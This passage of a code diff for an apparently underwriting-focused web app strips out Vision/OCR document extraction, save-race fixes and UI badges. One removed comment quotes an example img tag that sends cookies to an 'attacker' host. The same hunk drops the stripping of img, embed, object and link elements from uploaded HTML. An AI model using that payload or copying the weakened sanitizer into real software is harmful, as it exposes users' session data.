-      //      lower quality but works without network).
-      //   3) __SCANNED_PDF__ throw → manual paste modal (last resort).
-      // Provenance is stamped on meta so the file row badge and audit log
-      // show the actual extraction method, and the pipeline can adjust trust
-      // (e.g. low-confidence Vision still beats high-confidence Tesseract).
-
-      // === Tier 1: Claude Vision ===
-      // Try this first when the user is signed in (which they always are
-      // inside the workbench — auth is enforced at app load).
-      if (window.currentUser && typeof extractTextViaClaudeVision === 'function') {
-        try {
-          const visionResult = await extractTextViaClaudeVision(file, fileEntry);
-          const visionCleaned = visionResult.text.replace(/\s+/g, '').length;
-          if (visionCleaned >= 50) {
-            meta.extractedVia = 'claude-vision';
-            meta.ocrApplied = true;            // legacy field — UI badges still read this
-            meta.ocrConfidence = visionResult.confidence;
-            return visionResult.text;
-          }
-          // Vision returned essentially nothing — could be a non-text PDF
-          // (e.g. blueprints, photo of a building). Don't fall through to
-          // Tesseract because it'll get the same nothing. Throw the manual-
-          // paste signal directly.
-          throw new Error('__SCANNED_PDF__::' + pdf.numPages + ' page(s), vision extraction returned only ' + visionCleaned + ' chars — content may be non-text imagery (photos, blueprints) or blank pages. Paste content manually if needed.');
-        } catch (visionErr) {
-          // Vision failed for a recoverable reason (proxy unreachable,
-          // auth expiry, model error, payload too big). Fall through to
-          // Tesseract. The __SCANNED_PDF__ signal is intentional — re-throw
-          // those without falling through.
-          if (visionErr && visionErr.message && visionErr.message.startsWith('__SCANNED_PDF__::')) {
-            throw visionErr;
-          }
-          if (typeof logAudit === 'function') {
-            logAudit('Vision', 'Vision extraction FAILED for ' + file.name + ' · ' + (visionErr.message || visionErr) + ' · falling back to Tesseract', 'warn');
-          }
-          // Continue to Tier 2 below.
-        }
-      }
-
-      // === Tier 2: Tesseract.js ===
-      // Reached when (a) user not signed in, (b) Vision threw a non-fatal
-      // error, or (c) Vision unavailable in this build. Slower and lower
-      // quality but works offline.
-      if (fileEntry) {
-        fileEntry.ocrInProgress = true;
-        fileEntry.ocrProgress = 0;
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-      try {
-        await ensureTesseract();
-        if (typeof Tesseract === 'undefined') {
-          throw new Error('OCR engine failed to load');
-        }
-        const ocrResult = await ocrPdfDocument(pdf, fileEntry);
-        meta.extractedVia = 'tesseract';
-        meta.ocrApplied = true;
-        meta.ocrConfidence = ocrResult.confidence;
-        const ocrCleaned = ocrResult.text.replace(/\s+/g, '').length;
-        if (ocrCleaned < 50) {
-          throw new Error('__SCANNED_PDF__::' + pdf.numPages + ' page(s), OCR returned only ' + ocrCleaned + ' chars — content may be non-text imagery (photos, blueprints) or blank pages. Paste content manually if needed.');
-        }
-        return ocrResult.text;
-      } finally {
-        if (fileEntry) {
-          fileEntry.ocrInProgress = false;
-          delete fileEntry.ocrProgress;
-          if (typeof renderFileList === 'function') renderFileList();
-        }
-      }
+      throw new Error('__SCANNED_PDF__::' + pdf.numPages + ' page(s), ' + cleanedLength + ' text chars extracted — appears to be a scanned image PDF with no text layer. Use OCR, or paste the content manually.');
     }
-    meta.extractedVia = 'text-layer';
     return text;
   }
 
@@ -1875,85 +1263,10 @@ async function extractText(file, metadata, fileEntry) {
     throw new Error('__UNREADABLE__::PowerPoint content cannot be auto-extracted in-browser. Paste the relevant slide text manually, or export the deck to PDF first.');
   }
 
-  // Raster images — same extraction chain as scanned PDFs:
-  //   1) Claude Vision (handles handwriting, complex layouts, ACORD-on-photo)
-  //   2) Tesseract.js (offline fallback)
-  //   3) __UNREADABLE__ → manual paste
+  // Raster images — same story. OCR would need a heavy library (Tesseract.js ~10MB).
+  // For now, surface a clear manual-entry affordance.
   if (/\.(png|jpg|jpeg|webp|heic|heif|gif|bmp|tiff|tif)$/.test(name)) {
-    meta.kind = 'image';
-
-    // === Tier 1: Claude Vision ===
-    if (window.currentUser && typeof extractTextViaClaudeVisionFromImage === 'function') {
-      try {
-        const visionResult = await extractTextViaClaudeVisionFromImage(file, fileEntry);
-        const visionCleaned = visionResult.text.replace(/\s+/g, '').length;
-        if (visionCleaned >= 30) {
-          meta.extractedVia = 'claude-vision';
-          meta.ocrApplied = true;
-          meta.ocrConfidence = visionResult.confidence;
-          return visionResult.text;
-        }
-        throw new Error('__UNREADABLE__::Vision returned only ' + visionCleaned + ' chars — image may be a photo with no text (e.g. building exterior). Paste any visible text manually if relevant.');
-      } catch (visionErr) {
-        if (visionErr && visionErr.message && visionErr.message.startsWith('__UNREADABLE__::')) {
-          throw visionErr;
-        }
-        if (typeof logAudit === 'function') {
-          logAudit('Vision', 'Vision extraction FAILED for image ' + file.name + ' · ' + (visionErr.message || visionErr) + ' · falling back to Tesseract', 'warn');
-        }
-        // Fall through to Tesseract.
-      }
-    }
-
-    // === Tier 2: Tesseract.js ===
-    if (fileEntry) {
-      fileEntry.ocrInProgress = true;
-      fileEntry.ocrProgress = 0;
-      if (typeof renderFileList === 'function') renderFileList();
-    }
-    try {
-      await ensureTesseract();
-      if (typeof Tesseract === 'undefined') {
-        throw new Error('OCR engine failed to load');
-      }
-      const dataUrl = await new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = () => reject(new Error('Failed to read image'));
-        reader.readAsDataURL(file);
-      });
-      const img = await new Promise((resolve, reject) => {
-        const i = new Image();
-        i.onload = () => resolve(i);
-        i.onerror = () => reject(new Error('Failed to decode image'));
-        i.src = dataUrl;
-      });
-      const rawCanvas = document.createElement('canvas');
-      rawCanvas.width = img.naturalWidth || img.width;
-      rawCanvas.height = img.naturalHeight || img.height;
-      rawCanvas.getContext('2d').drawImage(img, 0, 0);
-      const procCanvas = preprocessCanvasForOCR(rawCanvas);
-      const ocrResult = await ocrImage(procCanvas, (p) => {
-        if (fileEntry) {
-          fileEntry.ocrProgress = p;
-          if (typeof renderFileList === 'function') renderFileList();
-        }
-      });
-      meta.extractedVia = 'tesseract';
-      meta.ocrApplied = true;
-      meta.ocrConfidence = ocrResult.confidence;
-      const ocrCleaned = ocrResult.text.replace(/\s+/g, '').length;
-      if (ocrCleaned < 30) {
-        throw new Error('__UNREADABLE__::OCR returned only ' + ocrCleaned + ' chars — image may be a photo with no text (e.g. building exterior). Paste any visible text manually if relevant.');
-      }
-      return ocrResult.text;
-    } finally {
-      if (fileEntry) {
-        fileEntry.ocrInProgress = false;
-        delete fileEntry.ocrProgress;
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-    }
+    throw new Error('__UNREADABLE__::Image files require OCR, which isn\'t enabled in this build. Paste the visible text manually.');
   }
 
   if (name.endsWith('.csv') || name.endsWith('.tsv')) {
@@ -2007,12 +1320,7 @@ async function extractText(file, metadata, fileEntry) {
     meta.kind = 'html';
     const tmp = document.createElement('div');
     tmp.innerHTML = await file.text();
-    // Phase 10.5 F12: strip image/source/embed/object/link too. Detached div
-    // images don't reliably trigger src GETs in modern Chrome/Firefox, but
-    // older Safari did and the spec is fuzzy. A hostile uploaded HTML file
-    // could include <img src="https://attacker/track?cookie=..."> as a
-    // tracking pixel. Cheap to close.
-    tmp.querySelectorAll('script, style, noscript, iframe, img, source, embed, object, link').forEach(el => el.remove());
+    tmp.querySelectorAll('script, style, noscript, iframe').forEach(el => el.remove());
     return (tmp.innerText || tmp.textContent || '').replace(/\n{3,}/g, '\n\n').trim();
   }
 
@@ -2213,16 +1521,11 @@ async function handleFiles(fileList) {
     renderFileList();
     try {
       const meta = {};
-      entry.text = await extractText(file, meta, entry);
-      // Stamp extraction provenance onto the entry so renderFileList can
-      // show the right badge (VISION/OCR) and downstream code knows the
-      // trust level. extractedVia: 'text-layer' | 'claude-vision' | 'tesseract'
-      if (meta.ocrApplied) {
-        entry.ocrApplied = true;
-        entry.ocrConfidence = meta.ocrConfidence || 0;
-      }
-      if (meta.extractedVia) {
-        entry.extractedVia = meta.extractedVia;
+      entry.text = await extractText(file, meta);
+      // v8.5 Rule 9: persist pageTexts on the file entry for the pipeline's
+      // per-section slicer. Only set when meta returned the array (PDFs).
+      if (meta.pageTexts && Array.isArray(meta.pageTexts)) {
+        entry.pageTexts = meta.pageTexts;
       }
       if (!entry.text || entry.text.length < 20) {
         entry.state = 'error';
@@ -2269,10 +1572,7 @@ async function handleFiles(fileList) {
         } else {
           coverageDetail = (meta.kind || 'text') + ' file';
         }
-        const provenanceTag = meta.extractedVia === 'claude-vision' ? ' · VISION (' + (meta.ocrConfidence || 0) + '% confidence)'
-          : meta.extractedVia === 'tesseract' ? ' · OCR (' + (meta.ocrConfidence || 0) + '% confidence)'
-          : '';
-        logAudit('Extract', file.name + ' · ' + coverageDetail + ' · ' + kbChars + 'K chars extracted' + provenanceTag, 'ok');
+        logAudit('Extract', file.name + ' · ' + coverageDetail + ' · ' + kbChars + 'K chars extracted', 'ok');
 
         // === EMAIL ATTACHMENT UNPACK ===
         // If this is a .msg with attachments, synthesize File objects from each
@@ -2308,13 +1608,10 @@ async function handleFiles(fileList) {
               // Parse the attachment synchronously — same extractText path, same error handling
               try {
                 const attMeta = {};
-                attachEntry.text = await extractText(pseudoFile, attMeta, attachEntry);
-                if (attMeta.ocrApplied) {
-                  attachEntry.ocrApplied = true;
-                  attachEntry.ocrConfidence = attMeta.ocrConfidence || 0;
-                }
-                if (attMeta.extractedVia) {
-                  attachEntry.extractedVia = attMeta.extractedVia;
+                attachEntry.text = await extractText(pseudoFile, attMeta);
+                // v8.5 Rule 9: persist pageTexts on attachment entries too
+                if (attMeta.pageTexts && Array.isArray(attMeta.pageTexts)) {
+                  attachEntry.pageTexts = attMeta.pageTexts;
                 }
                 if (!attachEntry.text || attachEntry.text.length < 20) {
                   attachEntry.state = 'error';
@@ -2330,10 +1627,7 @@ async function handleFiles(fileList) {
                     attachEntry.state = 'parsed';
                     attachEntry.extractMeta = attMeta;
                     const akb = Math.round(attachEntry.text.length / 1024 * 10) / 10;
-                    const provenanceTag = attMeta.extractedVia === 'claude-vision' ? ' · VISION (' + (attMeta.ocrConfidence || 0) + '% confidence)'
-                      : attMeta.extractedVia === 'tesseract' ? ' · OCR (' + (attMeta.ocrConfidence || 0) + '% confidence)'
-                      : '';
-                    logAudit('Extract', 'ATTACHMENT ' + att.name + ' (from ' + entry.name + ') · ' + akb + 'K chars extracted' + provenanceTag, 'ok');
+                    logAudit('Extract', 'ATTACHMENT ' + att.name + ' (from ' + entry.name + ') · ' + akb + 'K chars extracted', 'ok');
                   }
                 }
               } catch (attErr) {
@@ -2424,46 +1718,8 @@ function renderFileList() {
     let stateText = '';
     let extraBadge = '';
 
-    if (f.state === 'parsing') {
-      stateClass = 'parsing';
-      // Live extraction progress. Three flavors:
-      //   visionInProgress → Claude Vision is reading the doc (preferred path)
-      //   ocrInProgress    → Tesseract.js fallback is running
-      //   neither          → fast text-layer extraction in flight
-      if (f.visionInProgress) {
-        const pct = Math.round((f.visionProgress || 0) * 100);
-        const pageCount = f.visionTotalPages ? ' · ' + f.visionTotalPages + 'p' : '';
-        stateText = 'VISION · ' + pct + '%' + pageCount;
-      } else if (f.ocrInProgress) {
-        const pct = Math.round((f.ocrProgress || 0) * 100);
-        stateText = 'OCR · ' + pct + '%';
-      } else {
-        stateText = 'parsing…';
-      }
-    }
-    else if (f.state === 'parsed') {
-      stateClass = 'classified';
-      stateText = Math.round(f.text.length / 1024) + 'K chars · ready';
-      // Extraction provenance badge — shows the UW which path produced the
-      // text. VISION (Claude Vision via llm-proxy) is high-confidence;
-      // OCR (Tesseract.js) is the fallback and lower trust.
-      // Confidence colors:
-      //   ≥85% chartreuse (normal)
-      //   70-84% amber warn
-      //   <70% red danger + REVIEW chip
-      if (f.ocrApplied) {
-        const conf = f.ocrConfidence || 0;
-        const isVision = (f.extractedVia === 'claude-vision');
-        const label = isVision ? 'VISION' : 'OCR';
-        let bg = 'var(--signal)';        // ≥85 — normal chartreuse
-        if (conf < 70) bg = 'var(--danger)';
-        else if (conf < 85) bg = 'var(--warning)';
-        extraBadge = '<span style="display:inline-block; margin-left: 4px; font-family: var(--font-mono); font-size: 8.5px; font-weight: 700; background: ' + bg + '; color: #0A0E1A; padding: 1px 5px; border-radius: 2px; letter-spacing: 0.06em;">' + label + ' · ' + conf + '%</span>';
-        if (conf < 70) {
-          extraBadge += '<span style="display:inline-block; margin-left: 4px; font-family: var(--font-mono); font-size: 8.5px; font-weight: 700; background: var(--warning); color: #0A0E1A; padding: 1px 5px; border-radius: 2px; letter-spacing: 0.06em;">REVIEW</span>';
-        }
-      }
-    }
+    if (f.state === 'parsing') { stateClass = 'parsing'; stateText = 'parsing…'; }
+    else if (f.state === 'parsed') { stateClass = 'classified'; stateText = Math.round(f.text.length / 1024) + 'K chars · ready'; }
     else if (f.state === 'needs_manual') {
       // Scanned PDF or unreadable format — show amber warning badge + click-to-paste affordance.
       // The UW can paste the visible text into a modal to feed the pipeline the content it needs.
@@ -2480,40 +1736,22 @@ function renderFileList() {
       stateClass = 'classified';
       // Helper to render a classifier type as a compact file-list label.
       // Turns "supplemental_contractors" into "SUPP · CONTRACTORS", leaves simple types uppercased.
-      // Used as fallback when f.tag isn't present (legacy mocks, older data).
       const prettyType = (t) => {
         if (!t) return '';
         if (t.startsWith('supplemental_')) return 'SUPP · ' + t.slice('supplemental_'.length).toUpperCase();
         if (t === 'supplemental') return 'SUPP · GENERIC';
         return t.toUpperCase();
       };
-      // v8.4: show f.tag (specific identifier like "Lead $5M", "GL Loss Runs
-      // 2020-21", "ACORD 125") as the chip text. This is what the UW
-      // actually wants to see — not the bucket name. Falls back to the
-      // bucket label when tag isn't present (legacy classifications).
+      // Show combined-doc info
       if (f.isCombined && f.classifications && f.classifications.length > 1) {
-        // Combined: show every tag joined. Each classification has its own tag.
-        stateText = f.classifications.map(c => c.tag || prettyType(c.type)).join(' · ');
+        stateText = f.classifications.map(c => prettyType(c.type)).join(' + ');
         extraBadge = '<span style="display:inline-block; margin-left: 4px; font-family: var(--font-mono); font-size: 8.5px; font-weight: 700; background: var(--warning); color: #0A0E1A; padding: 1px 5px; border-radius: 2px; letter-spacing: 0.06em;">COMBINED</span>';
       } else {
-        stateText = f.tag || prettyType(f.classification);
+        stateText = prettyType(f.classification);
       }
       if (f.needsReview) {
         stateClass = 'unknown';  // use the amber border
         extraBadge = '<span style="display:inline-block; margin-left: 4px; font-family: var(--font-mono); font-size: 8.5px; font-weight: 700; background: var(--warning); color: #0A0E1A; padding: 1px 5px; border-radius: 2px; letter-spacing: 0.06em;">REVIEW</span>';
-      }
-      // Extraction provenance — appended since it's orthogonal to classification.
-      // VISION (Claude Vision) vs OCR (Tesseract.js fallback). Both use the
-      // same confidence color logic. UWs need this visible on classified files
-      // because the trust level affects whether to spot-check extracted numbers.
-      if (f.ocrApplied) {
-        const conf = f.ocrConfidence || 0;
-        const isVision = (f.extractedVia === 'claude-vision');
-        const label = isVision ? 'VISION' : 'OCR';
-        let bg = 'var(--signal)';
-        if (conf < 70) bg = 'var(--danger)';
-        else if (conf < 85) bg = 'var(--warning)';
-        extraBadge += '<span style="display:inline-block; margin-left: 4px; font-family: var(--font-mono); font-size: 8.5px; font-weight: 700; background: ' + bg + '; color: #0A0E1A; padding: 1px 5px; border-radius: 2px; letter-spacing: 0.06em;">' + label + ' · ' + conf + '%</span>';
       }
     }
     else if (f.state === 'error') { stateClass = 'error'; stateText = 'error: ' + (f.error || 'unknown'); }
@@ -2922,12 +2160,7 @@ async function archiveCurrentSubmission(opts) {
     customCards:    deepClone(STATE.customCards),
     hiddenCards:    deepClone(STATE.hiddenCards),
     handoff:        deepClone(STATE.handoff),
-    // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. The cloud
-    // audit_events table (written by sbLogAuditEvent on every logAudit call)
-    // is the single source of truth for audit history. Snapshotting STATE.audit
-    // into every submission caused (a) O(n²) storage bloat from duplicate
-    // copies and (b) cross-submission contamination when rehydrate replaced
-    // STATE.audit with another submission's snapshot.
+    audit:          STATE.audit.slice(),            // shallow is fine, events are flat
     runTotalCost:   STATE.runTotalCost || 0,
     pipelineRun:    STATE.pipelineRun
   };
@@ -3078,7 +2311,7 @@ function displayAccount(rec) {
 // Pull a submission's snapshot back into the workbench. Before doing so,
 // save the currently-active submission's state so the UW doesn't lose
 // anything when hopping between submissions.
-async function rehydrateSubmission(submissionId) {
+function rehydrateSubmission(submissionId) {
   const rec = STATE.submissions.find(s => s.id === submissionId);
   if (!rec || !rec.snapshot) {
     toast('Could not load submission — snapshot missing', 'error');
@@ -3097,21 +2330,19 @@ async function rehydrateSubmission(submissionId) {
   if (STATE.activeSubmissionId && STATE.activeSubmissionId !== submissionId) {
     const activeRec = STATE.submissions.find(s => s.id === STATE.activeSubmissionId);
     if (activeRec && STATE.pipelineDone) {
-      // Phase 10.5 F3: AWAIT the pre-switch flush so the SAVE_QUEUE chain
-      // settles BEFORE we snapshot + swap. The earlier comment-described race
-      // (Phase 8.5 round 3 fix #4) was correctly identified — pending
-      // debounced save needed to flush before snapshotting — but the fix was
-      // fire-and-forget, which didn't actually prevent the race.
-      // flushEditsNow handles three things in one call: clears the debounce
-      // timer, queues a final saveEditsNow if needed, and awaits SAVE_QUEUE.
-      // NOTE: per Phase 8.5 fix #1, we deliberately do NOT call saveEditsNow
-      // AFTER loading the target snapshot (it would race against the cloud
-      // overlay sbLoadEdits and could write stale snapshot edits over fresher
-      // cloud rows). Pre-switch flush only.
-      try {
-        await flushEditsNow();
-      } catch (e) {
-        console.warn('rehydrateSubmission: pre-switch flushEditsNow failed', e);
+      // Phase 8.5 round 3 fix #4: flush any pending debounced edit save
+      // BEFORE snapshotting. Without this, an edit made within the 450ms
+      // debounce window before the user clicks a different submission would
+      // race: the snapshot captures the new edit, but submission_edits still
+      // holds the OLD edit (because the debounce hasn't fired yet). Then on
+      // later rehydrate, sbLoadEdits overlays the stale cloud row on top of
+      // the fresh snapshot edit, silently losing the edit. Cancelling the
+      // timer and calling saveEditsNow() synchronously here forces the cloud
+      // edit row to match the snapshot before we move on.
+      if (SAVE_DEBOUNCE) {
+        clearTimeout(SAVE_DEBOUNCE);
+        SAVE_DEBOUNCE = null;
+        if (typeof saveEditsNow === 'function') saveEditsNow();
       }
       // Refresh snapshot with any edits the UW made to the active submission
       activeRec.snapshot = {
@@ -3121,8 +2352,7 @@ async function rehydrateSubmission(submissionId) {
         customCards:    deepClone(STATE.customCards),
         hiddenCards:    deepClone(STATE.hiddenCards),
         handoff:        deepClone(STATE.handoff),
-        // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. Cloud
-        // audit_events is the source of truth.
+        audit:          STATE.audit.slice(),
         runTotalCost:   STATE.runTotalCost || 0,
         pipelineRun:    STATE.pipelineRun
       };
@@ -3168,11 +2398,7 @@ async function rehydrateSubmission(submissionId) {
   STATE.customCards   = deepClone(snap.customCards || []);
   STATE.hiddenCards   = deepClone(snap.hiddenCards || {});
   STATE.handoff       = deepClone(snap.handoff || { status: null, viewAs: 'uw', history: [] });
-  // Phase 10.5 F1: STATE.audit is session-local now. Don't restore from snapshot.
-  // The cloud audit_events table holds the per-submission history (admins can
-  // filter by submission_id in the Admin → Audit panel). Keeping STATE.audit
-  // accumulating across the session is closer to user mental model ("the audit
-  // log shows what's happened") than wiping it on every submission switch.
+  STATE.audit         = (snap.audit || []).slice();
   STATE.runTotalCost  = snap.runTotalCost || 0;
   STATE.pipelineRun   = snap.pipelineRun || rec.pipelineRun;
   STATE.pipelineDone  = true;
@@ -4870,21 +4096,9 @@ Named Insured ✔ · Effective ✔ · Requested ✔ · Operations ✔ · States 
 // AUDIT LOG — every LLM call, file event, export action
 // ============================================================================
 function logAudit(actor, action, meta) {
-  // Phase 10.5 F2: normalize meta to a string at push time. Phase 10's structured
-  // logging passes meta as an object (status/latency/ray_id/etc.). The in-app
-  // audit pane renderer does escapeHtml(e.meta) which calls String(meta) →
-  // '[object Object]' for any object — making the most diagnostically valuable
-  // events unreadable in the local pane. Cloud-side sbLogAuditEvent does its
-  // own JSON.stringify on the original meta (see supabase-data.js), so the
-  // cloud row is unaffected by this normalization.
-  let metaForLocal = meta;
-  if (metaForLocal != null && metaForLocal !== '—' && typeof metaForLocal !== 'string') {
-    try { metaForLocal = JSON.stringify(metaForLocal); }
-    catch (e) { metaForLocal = String(metaForLocal); }
-  }
   STATE.audit.push({
     time: new Date().toISOString().slice(11, 19),
-    actor, action, meta: metaForLocal || '—',
+    actor, action, meta: meta || '—',
     ts: Date.now()
   });
   renderAuditIfOpen();
@@ -5722,15 +4936,10 @@ function deleteCard(mid) {
 async function revertCard(mid) {
   if (!confirm('Revert ' + (MODULES[mid] ? MODULES[mid].name : mid) + ' to original AI output? All your edits to this card will be lost.')) return;
   delete STATE.edits[mid];
-  // Phase 10.5 F6: drain any in-flight save BEFORE issuing the cloud-row delete.
-  // Without this, a saveEditsNow that fired from an earlier markDirty (debounce
-  // timer already fired, upsert in flight to Supabase) could land its upsert
-  // AFTER sbDeleteEdit completes — resurrecting the just-reverted card on next
-  // refresh. flushEditsNow clears any pending debounce, queues a final save
-  // reflecting the post-delete local state (no card:mid row), and awaits the
-  // entire SAVE_QUEUE chain to settle.
-  await flushEditsNow();
-
+  // Now awaited: the toast at the end reflects whether cloud cleanup AND
+  // snapshot resync both succeeded. Previously fire-and-forget — the
+  // optimistic "Reverted to original" toast could fire even if the cloud
+  // delete failed and the edit would resurrect on next refresh.
   let cloudOk = true;
   const sid = STATE.activeSubmissionId;
   if (sid && typeof sbDeleteEdit === 'function') {
@@ -5742,9 +4951,6 @@ async function revertCard(mid) {
       if (typeof logAudit === 'function') logAudit('Edits', 'Cloud revert FAILED for ' + mid + ' · ' + (e.message || e), 'error');
     }
   }
-  // markDirty here is intentional — it refreshes the save indicator UI but does
-  // NOT race against our delete because flushEditsNow already drained the queue
-  // and any save it triggers reflects the post-delete state.
   markDirty();
   renderSummaryCards();
   // Resync snapshot so reload doesn't resurrect the reverted edit. Awaited
@@ -5770,14 +4976,11 @@ async function restoreAllCards() {
   // rows on top of the snapshot).
   const hiddenIds = Object.keys(STATE.hiddenCards || {});
   STATE.hiddenCards = {};
-  // Phase 10.5 F6: drain any in-flight save before issuing parallel deletes.
-  // Without this, a saveEditsNow in flight from an earlier markDirty would
-  // upsert hidden:<id> rows AFTER our deletes complete, re-hiding the cards
-  // we just restored.
+  // Now awaited end-to-end: each hidden:<id> row delete must complete, AND
+  // the snapshot resync must complete, before the success toast fires.
+  // Previously the deletes fire-and-forget — could leave stale hidden rows
+  // in the cloud that would re-hide the cards on refresh.
   let cloudOk = true;
-  try {
-    await flushEditsNow();
-  } catch (e) { cloudOk = false; console.warn('restoreAllCards: flushEditsNow failed', e); }
   const sid = STATE.activeSubmissionId;
   if (sid && hiddenIds.length > 0 && typeof sbDeleteEdit === 'function') {
     // Run deletes in parallel but await them all before continuing.
@@ -6367,17 +5570,7 @@ document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () =>
 
 // New submission entry point — archives the currently-loaded submission (if any)
 // then clears state and opens the workbench for a fresh one.
-async function startNewSubmission() {
-  // Phase 10.5 Their #3: drain the SAVE_QUEUE before mutating any STATE.*. A
-  // pending debounced save (or save in flight) would otherwise fire AFTER our
-  // wipe and write empty edits over the previous submission's cloud rows.
-  // Same race shape as F3 (rehydrateSubmission) and F6 (revertCard) — same
-  // primitive solves all three.
-  try {
-    await flushEditsNow();
-  } catch (e) {
-    console.warn('startNewSubmission: pre-reset flushEditsNow failed', e);
-  }
+function startNewSubmission() {
   // Save any in-flight edits to the active submission before wiping
   if (STATE.activeSubmissionId && STATE.pipelineDone) {
     const activeRec = STATE.submissions.find(s => s.id === STATE.activeSubmissionId);
@@ -6389,8 +5582,7 @@ async function startNewSubmission() {
         customCards:    deepClone(STATE.customCards),
         hiddenCards:    deepClone(STATE.hiddenCards),
         handoff:        deepClone(STATE.handoff),
-        // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. Cloud
-        // audit_events is the source of truth.
+        audit:          STATE.audit.slice(),
         runTotalCost:   STATE.runTotalCost || 0,
         pipelineRun:    STATE.pipelineRun
       };
@@ -6437,10 +5629,7 @@ async function startNewSubmission() {
   STATE.edits = {};
   STATE.hiddenCards = {};
   STATE.customCards = [];
-  // Phase 10.5 F1: STATE.audit is session-local now. Don't wipe it on every
-  // new submission — let it accumulate as the session activity log. The cloud
-  // audit_events table holds the per-submission history (admins can filter
-  // by submission_id in Admin → Audit).
+  STATE.audit = [];
   STATE.runTotalCost = 0;
   STATE._pendingEdits = null;   // drop any stashed prior-session edits
   // Phase 4: edits no longer live in localStorage — they're in Supabase
@@ -6539,6 +5728,17 @@ function showStage(stage) {
         }
       }
       window.docsView.setSubmissionContext(sid, title);
+      // v8.5: explicitly trigger a cloud refresh on every showStage('docs').
+      // setSubmissionContext also triggers hydrate when local state is empty
+      // for the submission, but this is the belt-and-suspenders path: it
+      // also catches the cross-submission browse case (sid === null) and
+      // any case where local state is stale from edits made elsewhere.
+      if (typeof window.docsView.refreshFromCloud === 'function') {
+        window.docsView.refreshFromCloud({
+          reason: 'showStage_docs',
+          submissionId: sid,
+        }).catch(err => console.warn('[docs] showStage refresh failed:', err));
+      }
     }
     // Notify the docs view it's now visible (lets it lazy-init annotations,
     // canvas resize, and re-measure thumb scaling for any docs already loaded).
@@ -6552,20 +5752,10 @@ function showStage(stage) {
   }
 }
 
-function toast(msg, kind) {
-  // Phase 10.5 Their #4: kind argument was being silently dropped. 49 call
-  // sites pass 'warn' / 'error' / 'success' but the function ignored it, so
-  // every toast looked identical regardless of severity. The class suffix
-  // lets app.css differentiate via the existing --warning / --danger /
-  // --success palette variables (no new theme colors). Falls back to plain
-  // .toast for legacy single-arg callers.
+function toast(msg) {
   const w = document.getElementById('toastWrap');
   const t = document.createElement('div');
-  // Normalize known kinds; ignore anything else so a stray third arg or typo
-  // doesn't paint the toast invisibly.
-  const knownKinds = new Set(['info', 'warn', 'error', 'success']);
-  const safeKind = (kind && knownKinds.has(String(kind))) ? String(kind) : null;
-  t.className = 'toast' + (safeKind ? ' toast-' + safeKind : '');
+  t.className = 'toast';
   t.textContent = msg;
   w.appendChild(t);
   setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; }, 2600);
